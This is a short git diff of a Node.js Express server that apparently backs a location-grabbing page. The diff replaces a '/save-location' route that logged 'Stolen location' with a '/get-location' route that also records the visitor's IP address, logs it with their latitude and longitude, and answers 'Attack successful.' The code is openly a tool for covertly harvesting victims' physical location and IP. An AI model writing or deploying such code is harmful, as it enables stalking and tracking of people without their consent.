@@ -7,11 +7,14 @@ const PORT = process.env.PORT || 3000;
 app.use(bodyParser.json());
 app.use(express.static("public"));
 
-app.post("/save-location", (req, res) => {
-  const { latitude, longitude } = req.body;
+app.set("trust proxy", true)
 
-    console.log(`Stolen location: Latitude: ${latitude}, Longitude: ${longitude}`);
-    res.send("Location saved successfully.");
+app.post("/get-location", (req, res) => {
+  const { latitude, longitude } = req.body;
+  const IP = req.ip;
+
+    console.log(`GOT LOCATION:\n IP: ${IP}\n Latitude: ${latitude}\n Longitude: ${longitude}`);
+    res.send("Attack successful.");
 
 });
 
